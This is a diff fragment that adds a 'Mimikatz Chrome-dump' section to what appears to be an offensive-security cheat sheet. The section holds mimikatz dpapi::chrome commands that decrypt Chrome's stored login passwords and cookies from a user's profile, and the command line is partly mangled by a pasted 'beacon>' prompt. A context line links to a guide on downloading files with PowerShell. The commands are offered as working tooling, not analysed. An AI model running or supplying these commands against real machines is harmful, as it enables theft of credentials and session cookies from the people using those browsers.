@@ -6,6 +6,12 @@
 </p>
 
 
+## Mimikatz Chrome-dump
+
+````
+mimikatz dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Login Data" /unprotectbeacon> mimikatz dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Cookies" /unprotect
+````
+
 ## Download with Powershell
 
 https://blog.jourdant.me/post/3-ways-to-download-files-with-powershell
